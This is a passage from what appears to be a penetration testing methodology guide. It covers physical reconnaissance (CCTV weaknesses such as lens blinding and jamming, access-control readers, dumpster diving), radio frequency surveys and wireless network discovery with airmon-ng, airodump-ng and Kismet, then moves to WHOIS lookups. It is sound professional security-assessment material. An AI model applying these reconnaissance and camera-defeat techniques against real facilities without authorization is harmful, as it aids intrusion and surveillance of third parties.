as a visible deterrence, as well as an inconspicuous nature.
Surveillance/CCTV cameras are generally small high definition color
cameras that can not only focus to resolve minute detail, but by linking
the control of the cameras to a computer, objects can be tracked
semi-automatically. Observing and documenting the Surveillance/CCTV
system is critical for identifying the areas of coverage. While it might
not be possible to determine the specific camera type being utilized or
even the area of coverage it is possible to identify areas with or
without limited coverage. It should be noted if the Surveillance/CCTV
system is physically protected. If not, then it needs to be documented
if the Surveillance/CCTV camera is vulnerable to someone deliberately
destroying it. Additionally, a physically unprotected camera may be
subject to blurring or blocking the image by spraying substances or
obstructing the lens. Lasers can be used to blind or damage
Surveillance/CCTV cameras. For wireless Surveillance/CCTV systems,
broadcasting a signal at the same frequency as the wireless equipment
could make it subject to jamming.</p>
<p>Access control devices</p>
<p>Access control devices enable access control to areas and/or resources
in a given facility. Access control refers to the practice of
restricting entrance to a property, a building, or a room to authorized
persons. Access control can be achieved by a human (a security guard, or
receptionist), through mechanical means such as locks and keys, or
through technological means such as access control systems like the
Access control vestibule.</p>
<p>Access control devices historically were accomplished through keys and
locks. Electronic access control use is widely being implemented to
replace mechanical keys. Access control readers are generally classified
as Basic, Semi-intelligent, and Intelligent. A basic access control
reader simply reads a card number or PIN and forward it to a control
panel. The most popular type of access control readers are RF Tiny by
RFLOGICS, ProxPoint by HID, and P300 by Farpointe Data. Semi-intelligent
readers have inputs and outputs necessary to control door hardware
(lock, door contact, exit button), but do not make any access decisions.
Common Semi-intelligent readers are InfoProx Lite IPL200 by CEM Systems
and AP-510 by Apollo. Intelligent readers have all the inputs and
outputs necessary to control door hardware while having the memory and
the processing power necessary to make access decisions independently of
each other. Common Intelligent readers are the InfoProx IPO200 by CEM
Systems, AP-500 by Apollo, PowerNet IP Reader by Isonas Security
Systems, ID08 by Solus has the built in web service to make it user
friendly, Edge ER40 reader by HID Global, LogLock and UNiLOCK by ASPiSYS
Ltd, and BioEntry Plus reader by Suprema Inc.</p>
<p>Some readers may have additional features such as an LCD and function
buttons for data collection purposes (i.e. clock-in/clock-out events for
attendance reports), camera/speaker/microphone for intercom, and smart
card read/write support. Observe and document the type, number, and
locations of access control devices in use.</p>
<p>Environmental Design</p>
<p>Environmental design involves the surrounding environmental of a
building, or facility. In the scope of Physical security, environmental
design includes facilities geography, landscape, architecture, and
exterior design.</p>
<p>Observing the facilities and surrounding areas can highlight potential
areas of concern such as potential obscured areas due to geography and
landscaping. Architecture and exterior design can impact the ability of
security guards to protect property by creating areas of low or
no-visibility. In addition, the placement of fences, storage containers,
security guard shacks, barricades and maintenance areas could also prove
useful in the ability move around a facility in a covert manner.</p>
</div>
<div class="section" id="employee-behavior">
<h5>Employee Behavior<a class="headerlink" href="#employee-behavior" title="Permalink to this headline">¶</a></h5>
<p>Observing employees is often the one of the easier steps to perform.
Employee actions generally provide insight into any corporate behaviors
or acceptable norms. By observing, employees it is possible to determine
procedures in use or establish ingress and egress traffic patterns. It
is possible to utilize binoculars to observe any movement from a safe
distance.</p>
</div>
<div class="section" id="dumpster-diving">
<h5>Dumpster diving<a class="headerlink" href="#dumpster-diving" title="Permalink to this headline">¶</a></h5>
<p>Traditionally, most targets dispose of their trash in either garbage
cans or dumpsters. These may or may not be separated based upon the
recyclability of the material. The act of dumpster diving is the
practice of sifting through commercial or residential trash to find
items that have been discarded by their owners, but which may be useful.
This is often times an extremely dirty process that can yield
significant results. Dumpsters are usually located on private premises
and therefore may subject the assessment team to potentially trespassing
on property not owned by the target. Though the law is enforced with
varying degrees of rigor, ensure that this is authorized as part of the
engagement. Dumpster diving per se is often legal when not specifically
prohibited by law. Rather than take the refuse from the area, it is
commonly accepted to simply photograph the obtained material and then
return it to the original dumpster.</p>
</div>
<div class="section" id="rf-wireless-frequency-scanning">
<h5>RF / Wireless Frequency scanning<a class="headerlink" href="#rf-wireless-frequency-scanning" title="Permalink to this headline">¶</a></h5>
<p>A band is a section of the spectrum of radio communication frequencies,
in which channels are usually used or set aside for the same purpose. To
prevent interference and allow for efficient use of the radio spectrum,
similar services are allocated in bands of non-overlapping ranges of
frequencies.</p>
<p>As a matter of convention, bands are divided at wavelengths of
10<sup>n</sup> meters, or frequencies of 3?10<sup>n</sup> hertz. For
example, 30 MHz or 10 m divides shortwave (lower and longer) from VHF
(shorter and higher). These are the parts of the radio spectrum, and not
its frequency allocation.</p>
<p>Each of these bands has a basic band plan which dictates how it is to be
used and shared, to avoid interference, and to set protocol for the
compatibility of transmitters and receivers. Within the US, band plans
are allocated and controlled by the Federal Communications Commission
(FCC). The chart below illustrates the current band plans.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_12.png">Screenshot Here</a></p>
<p>To avoid confusion, there are two bands that we could focus on our
efforts on. The band plans that would in of interest to an attacker are
indicated in the following chart.</p>
<table border="1" class="docutils">
<colgroup>
<col width="11%" />
<col width="10%" />
<col width="11%" />
<col width="17%" />
<col width="52%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td>align = &#8220;center&#8221;|<strong>Band name</strong></td>
<td>align = &#8220;center&#8221;|<strong>Abbr</strong></td>
<td>align = &#8220;center&#8221;|<strong>ITU band</strong></td>
<td>align = &#8220;center&#8221;|<strong>Frequency and wavelength in air</strong></td>
<td>align = &#8220;center&#8221;|<strong>Example uses</strong></td>
</tr>
<tr class="row-even"><td>Very high frequency</td>
<td>VHF</td>
<td>8</td>
<td><div class="first last line-block">
<div class="line">30-300&nbsp;MHz</div>
<div class="line">10 m - 1 m</div>
</div>
</td>
<td>FM,&nbsp;television&nbsp;broadcasts and line-of-sight ground-to-aircraft and aircraft-to-aircraft communications. Land Mobile and Maritime Mobile communications,&nbsp;amateur radio, weather radio</td>
</tr>
<tr class="row-odd"><td>Ultra high frequency</td>
<td>UHF</td>
<td>9</td>
<td><div class="first last line-block">
<div class="line">300-3000&nbsp;MHz</div>
<div class="line">1 m - 100&nbsp;mm</div>
</div>
</td>
<td>Television&nbsp;broadcasts,&nbsp;microwave&nbsp;ovens,&nbsp;mobile phones,&nbsp;wireless LAN,&nbsp;Bluetooth, ZigBee,&nbsp;GPS&nbsp;and two-way radios such as Land Mobile,&nbsp;FRS&nbsp;and&nbsp;GMRS&nbsp;radios, amateur radio</td>
</tr>
</tbody>
</table>
<p>A Radio Frequency (RF) site survey or wireless survey, sometimes called
a wireless site survey, is the process of determining the frequencies in
use within a given environment. When conducting a RF site survey, it&#8217;s
very important to identify an effective range boundary, which involves
determining the SNR at various points around a facility.</p>
<p>To expedite the process, all frequencies in use should be determined
prior to arrival. Particular attention should be paid to security
guards, and frequencies that the target is licensed to use. Several
resources exist to assist in acquiring this information:</p>
<table border="1" class="docutils">
<colgroup>
<col width="13%" />
<col width="52%" />
<col width="35%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>Site</strong></td>
<td><strong>URL</strong></td>
<td><strong>Description</strong></td>
</tr>
<tr class="row-even"><td>Radio Reference</td>
<td><div class="first last line-block">
<div class="line"><a class="reference external" href="http://www.radioreference.com/apps/db/">http://www.radioreference.com/apps/db/</a></div>
</div>
</td>
<td>Free part of the site containing a wealth of information</td>
</tr>
<tr class="row-odd"><td>National Radio Data</td>
<td><a class="reference external" href="http://www.nationalradiodata.com/">http://www.nationalradiodata.com/</a></td>
<td><div class="first last line-block">
<div class="line">FCC database search / $29 year</div>
</div>
</td>
</tr>
<tr class="row-even"><td>Percon Corp</td>
<td><a class="reference external" href="http://www.perconcorp.com/">http://www.perconcorp.com</a></td>
<td><div class="first last line-block">
<div class="line">FCC database search / Paid site - custom rates</div>
</div>
</td>
</tr>
</tbody>
</table>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_13.png">Screenshot Here</a></p>
<p>At a minimum a search engine (Google, Bing, and Yahoo!) should be
utilized to conduct the following searches:</p>
<ul class="simple">
<li>&#8220;Target Company&#8221; scanner</li>
<li>&#8220;Target Company&#8221; frequency</li>
<li>&#8220;Target Company&#8221; guard frequency</li>
<li>&#8220;Target Company&#8221; MHz</li>
<li>Press releases from radio manufactures and reseller regarding the
target</li>
<li>Press releases from guard outsourcing companies talking about
contracts with the target company</li>
</ul>
</div>
</div>
<div class="section" id="frequency-usage">
<h4>Frequency Usage<a class="headerlink" href="#frequency-usage" title="Permalink to this headline">¶</a></h4>
<p>A frequency counter is an electronic instrument that is used for
measuring the number of oscillations or pulses per second in a
repetitive electronic signal. Using a Frequency counter or spectrum
analyzer it is possible to identify the transmitting frequencies in use
around the target facility. Common frequencies include the following:</p>
<table border="1" class="docutils">
<colgroup>
<col width="37%" />
<col width="63%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>Band</strong></td>
<td><strong>Frequency Range</strong></td>
</tr>
<tr class="row-even"><td>VHF</td>
<td>150 - 174 MHz</td>
</tr>
<tr class="row-odd"><td>UHF</td>
<td>420 - 425 MHz</td>
</tr>
<tr class="row-even"><td>UHF</td>
<td>450 - 470 MHz</td>
</tr>
<tr class="row-odd"><td>UHF</td>
<td>851 - 866 MHz</td>
</tr>
<tr class="row-even"><td>VHF</td>
<td>43.7- 50 MHz</td>
</tr>
<tr class="row-odd"><td>UHF</td>
<td>902 - 928 MHz</td>
</tr>
<tr class="row-even"><td>UHF</td>
<td>2400 - 2483.5 MHz</td>
</tr>
</tbody>
</table>
<p>A spectrum analyzer can be used to visually illustrate the frequencies
in use. These are usually targeting specific ranges that are generally
more focused than a frequency counter. Below is an output from a
spectrum analyzer that can clearly illustrate the frequencies in use.
The sweep range for this analyzer is 2399-2485 MHz.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_14.png">Screenshot Here</a></p>
<p>All frequency ranges in use in and around the target should be
documented.</p>
</div>
<div class="section" id="equipment-identification">
<h4>Equipment Identification<a class="headerlink" href="#equipment-identification" title="Permalink to this headline">¶</a></h4>
<p>As part of the on-site survey, all radios and antennas in use should be
identified. Including radio make and model as well as the length and
type of antennas utilized. A few good resources are available to help
you identify radio equipment:</p>
<table border="1" class="docutils">
<colgroup>
<col width="13%" />
<col width="43%" />
<col width="44%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>Site</strong></td>
<td><strong>URL</strong></td>
<td><strong>Description</strong></td>
</tr>
<tr class="row-even"><td>HamRadio Outlet</td>
<td><div class="first last line-block">
<div class="line"><a class="reference external" href="http://www.hamradio.com/">http://www.hamradio.com</a></div>
</div>
</td>
<td>A great source of information for amateur radios</td>
</tr>
<tr class="row-odd"><td>BatLabs</td>
<td><div class="first last line-block">
<div class="line"><a class="reference external" href="http://www.batlabs.com/">http://www.batlabs.com</a></div>
</div>
</td>
<td>A great source of information for Motorola two way systems</td>
</tr>
</tbody>
</table>
<p>Identifying 802.11 equipment is usually much easier to accomplish, if
not visually, then via RF emissions. For visual identification, most
vendor websites can be searched to identify the specific make and model
of the equipment in use.</p>
<table border="1" class="docutils">
<colgroup>
<col width="25%" />
<col width="75%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>Manufacturer</strong></td>
<td><strong>URL</strong></td>
</tr>
<tr class="row-even"><td>3com</td>
<td><a class="reference external" href="http://www.3com.com/">http://www.3com.com</a></td>
</tr>
<tr class="row-odd"><td>Apple</td>
<td><a class="reference external" href="http://www.apple.com/">http://www.apple.com</a></td>
</tr>
<tr class="row-even"><td>Aruba</td>
<td><a class="reference external" href="http://www.arubanetworks.com/">http://www.arubanetworks.com</a></td>
</tr>
<tr class="row-odd"><td>Atheros</td>
<td><a class="reference external" href="http://www.atheros.com/">http://www.atheros.com/</a></td>
</tr>
<tr class="row-even"><td>Belkin</td>
<td><a class="reference external" href="http://www.belkin.com/">http://www.belkin.com</a></td>
</tr>
<tr class="row-odd"><td>Bluesocket</td>
<td><a class="reference external" href="http://www.bluesocket.com/">http://www.bluesocket.com/</a></td>
</tr>
<tr class="row-even"><td>Buffalo Technology</td>
<td><a class="reference external" href="http://www.buffalotech.com/">http://www.buffalotech.com</a></td>
</tr>
<tr class="row-odd"><td>Cisco</td>
<td><a class="reference external" href="http://www.cisco.com/">http://www.cisco.com</a></td>
</tr>
<tr class="row-even"><td>Colubris</td>
<td><a class="reference external" href="http://www.colubris.com/">http://www.colubris.com/</a></td>
</tr>
<tr class="row-odd"><td>D-Link</td>
<td><a class="reference external" href="http://www.dlink.com/">http://www.dlink.com</a></td>
</tr>
<tr class="row-even"><td>Engenius Tech</td>
<td><a class="reference external" href="http://www.engeniustech.com/">http://www.engeniustech.com</a></td>
</tr>
<tr class="row-odd"><td>Enterasys</td>
<td><a class="reference external" href="http://www.enterasys.com/">http://www.enterasys.com</a></td>
</tr>
<tr class="row-even"><td>Hewlett Packard</td>
<td><a class="reference external" href="http://www.hp.com/">http://www.hp.com</a></td>
</tr>
<tr class="row-odd"><td>Juniper</td>
<td><a class="reference external" href="http://www.juniper.net/">http://www.juniper.net</a></td>
</tr>
<tr class="row-even"><td>Marvell</td>
<td><a class="reference external" href="http://www.marvell.com/">http://www.marvell.com</a></td>
</tr>
<tr class="row-odd"><td>Motorola</td>
<td><a class="reference external" href="http://www.motorola.com/">http://www.motorola.com</a></td>
</tr>
<tr class="row-even"><td>Netgear</td>
<td><a class="reference external" href="http://www.netgear.com/">http://www.netgear.com</a></td>
</tr>
<tr class="row-odd"><td>Ruckus Wireless</td>
<td><a class="reference external" href="http://www.ruckuswireless.com/">http://www.ruckuswireless.com/</a></td>
</tr>
<tr class="row-even"><td>SMC</td>
<td><a class="reference external" href="http://www.smc.com/">http://www.smc.com</a></td>
</tr>
<tr class="row-odd"><td>Trapeze</td>
<td><a class="reference external" href="http://www.trapezenetworks.com/">http://www.trapezenetworks.com/</a></td>
</tr>
<tr class="row-even"><td>TRENDnet</td>
<td><a class="reference external" href="http://www.trendnet.com/">http://www.trendnet.com</a></td>
</tr>
<tr class="row-odd"><td>Versa Technology</td>
<td><a class="reference external" href="http://www.versatek.com/">http://www.versatek.com</a></td>
</tr>
</tbody>
</table>
<p>In a passive manner, it is possible to identify at the manufacturer
based upon data collected from RF emissions.</p>
<p>Wireless Local Area Network (WLAN) discovery consists of enumerating the
type of WLAN that is currently deployed. This can be one of the
following: Unencrypted WLAN, WEP encrypted WLAN, WPA / WPA2 encrypted
WLAN, LEAP encrypted WLAN, or 802.1x WLAN. The tools required to
enumerate this information are highlighted as follows.</p>
<div class="section" id="airmon-ng">
<h5>Airmon-ng<a class="headerlink" href="#airmon-ng" title="Permalink to this headline">¶</a></h5>
<p>Airmon-ng is used to enable monitor mode on wireless interfaces. It may
also be used to go back from monitor mode to managed mode. It is
important to determine if our USB devices are properly detected. For
this we can use lsusb, to list the currently detected USB devices.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_15.png">Screenshot Here</a></p>
<div class="line-block">
<div class="line"><br /></div>
<div class="line">As the figure illustrates, our distribution has detected not only the
Prolific PL2303 Serial Port, where we have our USB GPS connected, but
also the Realtek RTL8187 Wireless Adapter. Now that we have determined
that our distribution recognizes the installed devices, we need to
determine if the wireless adapter is already in monitor mode by
running.</div>
</div>
<p>Entering the airmon-ng command without parameters will show the
interfaces status.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_16.png">Screenshot Here</a></p>
<p>To use one interface simply use airmon-ng to put your card in monitor
mode by running:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">start</span> <span class="n">wlan0</span>
</pre></div>
</div>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_17.png">Screenshot Here</a></p>
<p>If there&#8217;s an existing mon0, destroy it prior to issuing the previous
command:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">stop</span> <span class="n">mon0</span>
</pre></div>
</div>
<p>Once again, entering the airmon-ng command without parameters will show
the interfaces status.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_18.png">Screenshot Here</a></p>
</div>
<div class="section" id="airodump-ng">
<h5>Airodump-ng<a class="headerlink" href="#airodump-ng" title="Permalink to this headline">¶</a></h5>
<p>Airodump-ng is part of the Aircrack-ng is a network software suite.
Specifically, Airodump-ng is a packet sniffer that places air traffic
into Packet Capture (PCAP) files or Initialization Vectors (IVS) files
and shows information about wireless networks.</p>
<p>Airodump-ng is used for packet capture of raw 802.11 frames and is
particularly suitable for collecting WEP IVs (Initialization Vectors)
for later use with Aircrack-ng. If you have a GPS receiver connected to
the computer, Airodump-ng is capable of logging the coordinates of the
found APs. Before running Airodump-ng, start the Airmon-ng script to
list the detected wireless interfaces.</p>
<p>Usage:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">airodump</span><span class="o">-</span><span class="n">ng</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">options</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">interface</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="p">[</span><span class="o">&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">interface</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;...&lt;</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="p">]</span><span class="o">&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span>

<span class="n">Options</span><span class="p">:</span>

<span class="o">--</span><span class="n">ivs</span>               <span class="p">:</span> <span class="n">Save</span> <span class="n">only</span> <span class="n">captured</span> <span class="n">IVs</span>

<span class="o">--</span><span class="n">gpsd</span>              <span class="p">:</span> <span class="n">Use</span> <span class="n">GPSd</span>

<span class="o">--</span><span class="n">write</span>    <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">prefix</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Dump</span> <span class="n">file</span> <span class="n">prefix</span>

<span class="o">-</span><span class="n">w</span>                  <span class="p">:</span> <span class="n">same</span> <span class="k">as</span> <span class="o">--</span><span class="n">write</span>

<span class="o">--</span><span class="n">beacons</span>           <span class="p">:</span> <span class="n">Record</span> <span class="nb">all</span> <span class="n">beacons</span> <span class="ow">in</span> <span class="n">dump</span> <span class="n">file</span>

<span class="o">--</span><span class="n">update</span>     <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">secs</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Display</span> <span class="n">update</span> <span class="n">delay</span> <span class="ow">in</span> <span class="n">seconds</span>

<span class="o">--</span><span class="n">showack</span>           <span class="p">:</span> <span class="n">Prints</span> <span class="n">ack</span><span class="o">/</span><span class="n">cts</span><span class="o">/</span><span class="n">rts</span> <span class="n">statistics</span>

<span class="o">-</span><span class="n">h</span>                  <span class="p">:</span> <span class="n">Hides</span> <span class="n">known</span> <span class="n">stations</span> <span class="k">for</span> <span class="o">--</span><span class="n">showack</span>

<span class="o">-</span><span class="n">f</span>          <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">msecs</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Time</span> <span class="ow">in</span> <span class="n">ms</span> <span class="n">between</span> <span class="n">hopping</span> <span class="n">channels</span>

<span class="o">--</span><span class="n">berlin</span>     <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">secs</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Time</span> <span class="n">before</span> <span class="n">removing</span> <span class="n">the</span> <span class="n">AP</span><span class="o">/</span><span class="n">client</span>

<span class="kn">from</span> <span class="nn">the</span> <span class="n">screen</span> <span class="n">when</span> <span class="n">no</span> <span class="n">more</span> <span class="n">packets</span>

<span class="n">are</span> <span class="n">received</span> <span class="p">(</span><span class="n">Default</span><span class="p">:</span> <span class="mi">120</span> <span class="n">seconds</span><span class="p">)</span>

<span class="o">-</span><span class="n">r</span>           <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">file</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Read</span> <span class="n">packets</span> <span class="kn">from</span> <span class="nn">that</span> <span class="n">file</span>

<span class="o">-</span><span class="n">x</span>          <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">msecs</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Active</span> <span class="n">Scanning</span> <span class="n">Simulation</span>

<span class="o">--</span><span class="n">output</span><span class="o">-</span><span class="nb">format</span>

<span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">formats</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Output</span> <span class="nb">format</span><span class="o">.</span>  <span class="n">Possible</span> <span class="n">values</span><span class="p">:</span>

<span class="n">pcap</span><span class="p">,</span> <span class="n">ivs</span><span class="p">,</span> <span class="n">csv</span><span class="p">,</span> <span class="n">gps</span><span class="p">,</span> <span class="n">kismet</span><span class="p">,</span> <span class="n">netxml</span>

<span class="n">Short</span> <span class="nb">format</span> <span class="s2">&quot;-o&quot;</span>

<span class="n">The</span> <span class="n">option</span> <span class="n">can</span> <span class="n">be</span> <span class="n">specified</span> <span class="n">multiple</span>   <span class="n">times</span><span class="o">.</span>  <span class="n">In</span> <span class="n">this</span> <span class="n">case</span><span class="p">,</span> <span class="n">each</span> <span class="n">file</span> <span class="nb">format</span> <span class="n">specified</span> <span class="n">will</span> <span class="n">be</span> <span class="n">output</span><span class="o">.</span>  <span class="n">Only</span> <span class="n">ivs</span> <span class="ow">or</span> <span class="n">pcap</span> <span class="n">can</span> <span class="n">be</span> <span class="n">used</span><span class="p">,</span> <span class="ow">not</span> <span class="n">both</span><span class="o">.</span>
</pre></div>
</div>
<p>Airodump-ng will display a list of detected APs and a list of connected
clients (&#8220;stations&#8221;).</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_19.png">Screenshot Here</a></p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_20.png">Screenshot Here</a></p>
<p>The first line shows the current channel, elapsed running time, current
date and optionally if a WPA/WPA2 handshake was detected.</p>
</div>
<div class="section" id="kismet-newcore">
<h5>Kismet-Newcore<a class="headerlink" href="#kismet-newcore" title="Permalink to this headline">¶</a></h5>
<p>Kismet-newcore is a network detector, packet sniffer, and intrusion
detection system for 802.11 wireless LANs. Kismet will work with any
wireless card which supports raw monitoring mode, and can sniff 802.11a,
802.11b, 802.11g, and 802.11n traffic.</p>
<p>Kismet identifies networks by passively collecting packets and detecting
standard named networks, detecting (and given time, decloaking) hidden
networks, and inferring the presence of nonbeaconing networks via data
traffic.</p>
<p>Kismet is composed of 3 parts:</p>
<ul class="simple">
<li>&#8216;&#8217;&#8216;Drones: &#8216;&#8217;&#8216;Capture the wireless traffic to report it to the
server; they have to be started manually.</li>
<li>&#8216;&#8217;&#8216;Server: &#8216;&#8217;&#8216;Central place that connects to the drones and accepts
client connections. It can also capture wireless traffic.</li>
<li>&#8216;&#8217;&#8216;Client: &#8216;&#8217;&#8216;The GUI part that will connect to the server.</li>
</ul>
<p>Kismet has to be configured to work properly. First, we need to
determine if it is already in monitor mode by running:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span>
</pre></div>
</div>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_21.png">Screenshot Here</a></p>
<p>To use one interface simply use airmon-ng to put your card in monitor
mode by running:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">start</span> <span class="n">wlan0</span>
</pre></div>
</div>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_22.png">Screenshot Here</a></p>
<p>If there&#8217;s an existing mon0, destroy it prior to issuing the previous
command:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">stop</span> <span class="n">mon0</span>
</pre></div>
</div>
<p>Kismet is able to use more than one interface like Airodump-ng. To use
that feature, /etc/kismet/kismet.conf has to be edited manually as
airmon-ng cannot configure more than one interface for kismet. For each
adapter, add a source line into kismet.conf.</p>
<p>Note:&#8217;&#8216;&#8217; &#8216;&#8217;&#8216;By default kismet stores its capture files in the directory
where it is started. These captures can be used with Aircrack-ng.</p>
<p>Typing, &#8220;kismet&#8221; in a console and hitting &#8220;Enter&#8221; will start up Kismet.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_23.png">Screenshot Here</a></p>
<p>As described earlier Kismet consists of three components and the initial
screen informs us that we need to either start the Kismet server or
choose to use a server that has been started elsewhere. For our
purposes. we will click &#8220;Yes&#8221; to start the Kismet server locally.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_24.png">Screenshot Here</a></p>
<p>Kismet presents us with the options to choose as part of the server
startup process.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_25.png">Screenshot Here</a></p>
<p>Unless we configured a source in /etc/kismet/kismet.conf then we will
need to specify a source from where we want to capture packets.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_26.png">Screenshot Here</a></p>
<p>As referenced earlier, we created a monitor sub-interface from our
wireless interface. For our purposes, we will enter &#8220;mon0&#8221;, though your
interface may have a completely different name.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_27.png">Screenshot Here</a></p>
<div class="line-block">
<div class="line"><br /></div>
<div class="line">When Kismet server and client are running properly then wireless
networks should start to show up. We have highlighted a WEP enabled
network. There are numerous sorting options that you can choose from.
We will not cover all the functionality of Kismet at this point, but
if you&#8217;re not familiar with the interface you should play with it
until you get comfortable.</div>
</div>
</div>
<div class="section" id="inssider">
<h5>inSSIDer<a class="headerlink" href="#inssider" title="Permalink to this headline">¶</a></h5>
<p>If you are used to using Netstumbler you may be disappointed to hear
that it doesn&#8217;t function properly with Windows Vista and 7 (64-bit).
That being said, all is not lost as there is an alternative that is
compatible with Windows XP, Vista and 7 (32 and 64-bit). It makes use of
the native Wi-Fi API and is compatible with most GPS devices (NMEA v2.3
and higher). InSSIDer has some features that make it the tool of choice
if you&#8217;re using Windows. InSSIDer can track the strength of received
signal in dBi over time, filter access points, and also export Wi-Fi and
GPS data to a KML file to view in Google Earth.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_28.png">Screenshot Here</a></p>
</div>
</div>
</div>
<div class="section" id="external-footprinting">
<h3>External Footprinting<a class="headerlink" href="#external-footprinting" title="Permalink to this headline">¶</a></h3>
<p>The External Footprinting phase of Intelligence Gathering involves
collecting response results from a target based upon direct interaction
from an external perspective. The goal is to gather as much information
about the target as possible.</p>
<div class="section" id="identifying-ip-ranges">
<h4>Identifying IP Ranges<a class="headerlink" href="#identifying-ip-ranges" title="Permalink to this headline">¶</a></h4>
<p>For external footprinting, we first need to determine which one of the
WHOIS servers contains the information we&#8217;re after. Given that we should
know the TLD for the target domain, we simply have to locate the
Registrar that the target domain is registered with.</p>
<p>WHOIS information is based upon a tree hierarchy. ICANN (IANA) is the
authoritative registry for all of the TLDs and is a great starting point
for all manual WHOIS queries.</p>
<div class="section" id="whois-lookup">
<h5>WHOIS lookup<a class="headerlink" href="#whois-lookup" title="Permalink to this headline">¶</a></h5>
<ul class="simple">
<li>ICANN - <a class="reference external" href="http://www.icann.org">http://www.icann.org</a></li>
<li>IANA - <a class="reference external" href="http://www.iana.com">http://www.iana.com</a></li>
<li>NRO - <a class="reference external" href="http://www.nro.net">http://www.nro.net</a></li>
<li>AFRINIC - <a class="reference external" href="http://www.afrinic.net">http://www.afrinic.net</a></li>
<li>APNIC - <a class="reference external" href="http://www.apnic.net">http://www.apnic.net</a></li>
<li>ARIN - <a class="reference external" href="http://ws.arin.net">http://ws.arin.net</a></li>
<li>LACNIC - <a class="reference external" href="http://www.lacnic.net">http://www.lacnic.net</a></li>
<li>RIPE - <a class="reference external" href="http://www.ripe.net">http://www.ripe.net</a></li>
</ul>
